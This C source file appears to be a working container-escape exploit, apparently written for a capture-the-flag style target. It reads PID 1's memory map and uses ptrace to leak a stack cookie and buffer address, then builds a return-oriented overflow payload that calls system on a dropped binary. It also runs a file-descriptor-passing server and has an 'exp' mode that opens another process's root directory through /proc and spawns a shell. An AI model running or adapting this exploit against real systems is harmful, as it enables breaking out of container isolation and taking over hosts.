#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <sys/reg.h>

#define FSERV_ADDR "FILESERV2"

#define BUF_READ 256

#define CHK(fn, args...) ({ \
    int64_t __res = fn(args); \
    if (__res == -1) { \
      err(1, "%s: %d: %s", __FILE__, __LINE__, #fn); \
    } \
    __res; \
  })

#define CHKPTR(fn, args...) ({ \
    void* __res = fn(args); \
    if (__res == NULL) { \
      err(1, "%s: %d: %s", __FILE__, __LINE__, #fn); \
    } \
    __res; \
  })

typedef struct file_header {
  int oflags;
  int perm;
  size_t name_sz;
} file_header;

int read_exact(int fd, void *out, size_t nbytes) {
  while (nbytes) {
    ssize_t n;
    n = read(fd, out, nbytes);
    if (n < 0) {
      return -1;
    }
    nbytes -= n;
    out += n;
    if (!n) {
      errno = EPIPE;
      return -1;
    }
  }

  return 0;
}

int write_exact(int fd, const void *in, size_t nbytes) {
  while (nbytes) {
    ssize_t n;
    n = write(fd, in, nbytes);
    if (n < 0) {
      return -1;
    }
    nbytes -= n;
    in += n;
    if (!n) {
      errno = EPIPE;
      return -1;
    }
  }

  return 0;
}

union our_control {
  char buf[CMSG_SPACE(sizeof(int))];
  struct cmsghdr align;
};

void sendfd(int client, int value) {
  struct msghdr msgh;
  struct iovec iov;
  struct cmsghdr *cmsgp;
  int transmit = value;

  union our_control controlMsg;

  memset(&msgh, 0, sizeof(msgh));

  // We transmit the success/error code in data channel
  msgh.msg_iov = &iov;
  msgh.msg_iovlen = 1;
  iov.iov_base = &transmit;
  iov.iov_len = sizeof(transmit);

  if (value > 0) {
    // if value > 0 we are transmitting an fd with a success code,
    // otherwise we are just transmitting an error value.
    transmit = 0;

    // Set msghdr to describe ancillary data
    msgh.msg_control = controlMsg.buf;
    msgh.msg_controllen = sizeof(controlMsg.buf);

    // Set up ancillary data with the file descriptor we are sending.
    cmsgp = CMSG_FIRSTHDR(&msgh);
    cmsgp->cmsg_level = SOL_SOCKET;
    cmsgp->cmsg_type = SCM_RIGHTS;
    cmsgp->cmsg_len = CMSG_LEN(sizeof(value));
    memcpy(CMSG_DATA(cmsgp), &value, sizeof(value));
  }

  CHK(sendmsg, client, &msgh, 0);
}

int recvfd(int client) {
  struct msghdr msgh;
  struct iovec iov;
  struct cmsghdr *cmsgp;
  int data;

  union our_control controlMsg;

  memset(&msgh, 0, sizeof(msgh));

  // We transmit the success/error code in data channel
  msgh.msg_iov = &iov;
  msgh.msg_iovlen = 1;
  iov.iov_base = &data;
  iov.iov_len = sizeof(data);

  // Set msghdr to describe ancillary data
  msgh.msg_control = controlMsg.buf;
  msgh.msg_controllen = sizeof(controlMsg.buf);

  CHK(recvmsg, client, &msgh, 0);

  if (data < 0) {
    errno = -data;
    return -1;
  }

  cmsgp = CMSG_FIRSTHDR(&msgh);
  if (cmsgp == NULL
      || cmsgp->cmsg_len != CMSG_LEN(sizeof(int))
      || cmsgp->cmsg_level != SOL_SOCKET
      || cmsgp->cmsg_type != SCM_RIGHTS)
  {
    errno = EINVAL;
    return -1;
  }

  memcpy(&data, CMSG_DATA(cmsgp), sizeof(data));
  return data;
}

void fserv_main(int client) {
  file_header hdr;
  for (;;) {
    if (read_exact(client, &hdr, sizeof(hdr)) < 0)
      goto send_error;

    if (hdr.name_sz > 0x1000) {
      errno = EINVAL;
      goto send_error;
    }

    char *filename = malloc(hdr.name_sz);
    if (filename == NULL) {
      goto send_error;
    }
    if (read_exact(client, filename, hdr.name_sz) < 0)
      goto send_error;

    int fd = open(filename, hdr.oflags, hdr.perm);
    if (fd < 0) {
      warn("open failed");
      goto send_error;
    }

    sendfd(client, fd);
    continue;

send_error:
    sendfd(client, -errno);
  }
}

int fserv() {
  int sock = CHK(socket, AF_UNIX, SOCK_STREAM, 0);
  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));

  addr.sun_family = AF_UNIX;
  strcpy(&addr.sun_path[1], FSERV_ADDR);
  CHK(bind, sock, (struct sockaddr*)&addr, sizeof(addr));
  CHK(listen, sock, 5);
  for(;;) {
    int client = CHK(accept, sock, NULL, NULL);
    int child = CHK(fork);
    if (child == 0) {
      fserv_main(client);
      exit(0);
    }

    close(client);
  }
}

int exploit(int argc, char **argv) {
  char buff[0x100];
  int pid;
  if (argc < 2) {
    puts("Usage: exp PID");
    return 1;
  }
  if (sscanf(argv[1], "%d", &pid) != 1) {
    puts("Invalid PID");
    return 1;
  }

  sprintf(buff, "/proc/%d/root/", pid);

  int sock = CHK(socket, AF_UNIX, SOCK_STREAM, 0);
  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));

  addr.sun_family = AF_UNIX;
  strcpy(&addr.sun_path[1], FSERV_ADDR);
  CHK(connect, sock, (struct sockaddr*)&addr, sizeof(addr));

  file_header hdr;
  hdr.name_sz = strlen(buff) + 1;
  hdr.oflags = O_RDONLY | O_PATH;
  hdr.perm = 0;

  CHK(write_exact, sock, &hdr, sizeof(hdr));
  CHK(write_exact, sock, buff, hdr.name_sz);

  printf("Opening: %s in fserv\n", buff);
  int fd = CHK(recvfd, sock);
  printf("Opened root dir on fd %d. Droping to shell...\n", fd);
  system("/bin/sh");
  return 0;
}

char *write_bof_exp() {
  //int pid;
  //if (argc < 2) {
  //  puts("Usage: cookie PID");
  //  return 1;
  //}
  //if (sscanf(argv[1], "%d", &pid) != 1) {
  //  puts("Invalid PID");
  //  return 1;
  //}

  FILE *mapf = CHKPTR(fopen, "/proc/1/maps", "r");
  char *line = NULL;
  size_t line_sz = 0;
  uint64_t heap_addr;
  uint64_t exe_addr;
  uint64_t cookie;
  uint64_t buff_addr;

  getline(&line, &line_sz, mapf);
  if (!strstr(line, "[heap]")) {
    puts("[!] First maps line is not [heap]");
    return NULL;
  }

  if (sscanf(line, "%lx", &heap_addr) != 1) {
    puts("[!] Unable to read address");
    return NULL;
  }

  printf("[*] Heap addr: 0x%016lx\n", heap_addr);

  getline(&line, &line_sz, mapf);
  if (!strstr(line, "containerd")) {
    puts("[!] Second maps line is not containerd executable");
    return NULL;
  }

  if (sscanf(line, "%lx", &exe_addr) != 1) {
    puts("[!] Unable to read address");
    return NULL;
  }

  printf("[*] Exe addr: 0x%016lx\n", exe_addr);

  CHK(ptrace, PTRACE_ATTACH, 1, 0, 0);
  CHK(waitpid, 1, NULL, 0);

  cookie = CHK(ptrace, PTRACE_PEEKDATA, 1, heap_addr + 0x380 + 0x28, 0);
  printf("[*] Cookie: 0x%016lx\n", cookie);
  buff_addr = CHK(ptrace, PTRACE_PEEKUSER, 1, RSP*8, 0) + 0x598;
  printf("[*] Address of buffer: 0x%016lx\n", buff_addr);

  CHK(ptrace, PTRACE_DETACH, 1, 0, 0);

  char *buf = malloc(BUF_READ);
  memset(buf, 'A', BUF_READ);

  uint64_t *ptr = (uint64_t*)(buf + 0x98);
  *(uint64_t*)(buf + 0x88) = cookie;

  *(ptr++) = exe_addr + 0xc1c0; // pop rdi ; ret
  uint64_t *save = ptr++;
  *(ptr++) = exe_addr + 0xc1c1; // ret
  *(ptr++) = exe_addr + 0x14eb0; // system

  strcpy((char*)ptr, "/tmp/fserv");
  *save = buff_addr + ((char*)ptr - buf);
  return buf;
}

int exec_debian();

int main(int argc, char **argv) {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  setbuf(stdin, NULL);

  char *filename = strrchr(argv[0], '/');
  if (filename)
    filename++;
  else
    filename = argv[0];

  if (!strcmp(filename, "init")) {
    mkdir("/bin", 0777);
    symlink("busybox", "/bin/exp");
    symlink("busybox", "/bin/fserv");
    symlink("busybox", "/bin/start_fserv");
    symlink("busybox", "/bin/debian");

    int in = open("/proc/self/exe", O_RDONLY);
    int out = open("/bin/busybox", O_CREAT | O_WRONLY, 0777);
    while (sendfile(out, in, NULL, 0x1000) > 0);
    close(out);
    close(in);

    for(;;) {
     if (wait(NULL) < 0) {
        sleep(1);
      }
    }
  } else if (!strcmp(filename, "start_fserv")) {
    system("cp /tmp/working/bin/fserv /tmp/fserv");
    char *buf = write_bof_exp();
    int parent_fd = 6;
    if (argc >= 2) parent_fd = atoi(argv[1]);
    CHK(write, parent_fd, buf, BUF_READ);
  } else if (!strcmp(filename, "exp")) {
    return exploit(argc, argv);
  } else if (!strcmp(filename, "debian")) {
    return exec_debian();
  } else if (!strcmp(filename, "fserv")) {
    return fserv();
  } else {
    return execl("/bin/busybox", "/bin/sh", NULL);
  }
}
